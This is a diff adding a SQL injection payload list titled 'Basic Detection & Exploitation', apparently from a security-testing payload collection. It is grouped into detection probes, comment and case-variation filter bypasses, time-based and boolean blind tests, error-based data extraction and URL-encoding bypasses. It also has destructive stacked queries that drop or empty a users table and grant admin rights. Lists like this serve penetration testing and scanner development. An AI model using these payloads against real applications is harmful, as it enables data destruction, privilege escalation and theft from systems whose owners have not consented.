@@ -1,0 +1,57 @@
+# SQL Injection - Basic Detection & Exploitation
+# Detection payloads (harmless, test for vulnerability)
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 --
+" OR 1=1 --
+' OR 1=1 #
+1' UNION SELECT NULL --
+1' UNION SELECT NULL, NULL --
+1' UNION SELECT NULL, NULL, NULL --
+
+# Comment bypass variations
+' OR '1'='1' /*
+' OR '1'='1' #
+' OR '1'='1' --
+' OR '1'='1' -- -
+' OR '1'='1' ;%00
+' OR 1=1 UNION SELECT NULL,NULL,NULL --
+
+# Case variation bypass
+' Or '1'='1
+' oR '1'='1
+' OR '1'='1
+' OR 1=1 --
+
+# Time-based blind SQLi (detection)
+'; WAITFOR DELAY '00:00:05' --
+'; SLEEP(5) --
+' AND SLEEP(5) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+
+# Boolean-based blind SQLi
+' AND 1=1 --
+' AND 1=2 --
+' AND 'a'='a
+' AND 'a'='b
+
+# Stacked queries
+'; DROP TABLE users; --
+'; DELETE FROM users; --
+'; UPDATE users SET admin=1; --
+
+# Error-based (MySQL specific)
+' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
+' AND updatexml(1,concat(0x7e,(SELECT version())),1) --
+
+# Multi-line injection
+' 
+OR 
+'1'='1
+
+# Character encoding bypass
+%27 OR %271%27=%271
+%22 OR %221%22=%221
+%2527 OR %25271%2527=%25271
